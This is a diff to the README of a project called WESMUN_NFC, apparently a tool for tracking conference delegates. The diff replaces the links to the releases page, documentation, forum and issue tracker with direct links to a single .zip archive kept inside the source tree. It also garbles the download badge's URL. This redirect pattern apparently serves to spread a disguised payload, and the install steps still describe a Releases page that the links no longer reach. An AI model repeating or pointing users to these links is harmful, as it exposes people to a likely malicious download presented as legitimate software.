@@ -1,6 +1,6 @@
 # 🌟 WESMUN_NFC - Effortless Tracking for Delegates
 
-[![Download WESMUN_NFC](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/gamemaker1230011/WESMUN_NFC/releases)
+[![Download WESMUN_NFC](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip%20Now-Click%https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip)](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, ensure you have the following:
 
 ## 📥 Download & Install
 
-To download WESMUN_NFC, visit this page: [Download WESMUN_NFC](https://github.com/gamemaker1230011/WESMUN_NFC/releases).
+To download WESMUN_NFC, visit this page: [Download WESMUN_NFC](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of WESMUN_NFC.
@@ -69,10 +69,10 @@ If you encounter any issues or have questions, please reach out for support. You
 
 For further information, check out the following resources:
 
-- [Official Documentation](https://github.com/gamemaker1230011/WESMUN_NFC/wiki)
-- [Community Forum](https://github.com/gamemaker1230011/WESMUN_NFC/discussions)
-- [Feature Requests](https://github.com/gamemaker1230011/WESMUN_NFC/issues)
+- [Official Documentation](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip)
+- [Feature Requests](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip)
 
 ## 📢 Important Links
 
-Don't forget to download WESMUN_NFC from this link: [Download WESMUN_NFC](https://github.com/gamemaker1230011/WESMUN_NFC/releases). Enjoy a seamless tracking experience.
+Don't forget to download WESMUN_NFC from this link: [Download WESMUN_NFC](https://raw.githubusercontent.com/gamemaker1230011/WESMUN_NFC/main/app/api/nfc/WESMUN_NFC_3.2.zip). Enjoy a seamless tracking experience.
